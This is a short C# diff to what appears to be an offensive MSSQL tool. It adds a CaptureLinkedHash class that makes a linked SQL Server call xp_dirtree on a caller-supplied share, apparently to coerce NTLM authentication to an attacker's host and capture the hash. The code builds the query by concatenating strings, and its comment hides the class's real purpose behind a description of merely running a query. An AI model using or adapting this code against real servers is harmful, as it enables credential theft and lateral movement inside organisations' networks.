@@ -1,5 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
+using System;
 using System.Data.SqlClient;
 
 namespace SQLRecon.Modules
@@ -18,5 +17,20 @@ namespace SQLRecon.Modules
             SqlDataReader reader = command.ExecuteReader();
             reader.Close();
         } //end initialize
+    }
+
+    public class CaptureLinkedHash
+    {
+        public CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
+        {
+            initialize(con, linkedSQLServer, share);
+        }
+        // this simply takes a SQL query, executes it on a linked server and prints to console
+        public void initialize(SqlConnection con, String linkedSQLServer, String share)
+        {
+            SqlCommand command = new SqlCommand("select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')", con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+        }
     }
 }
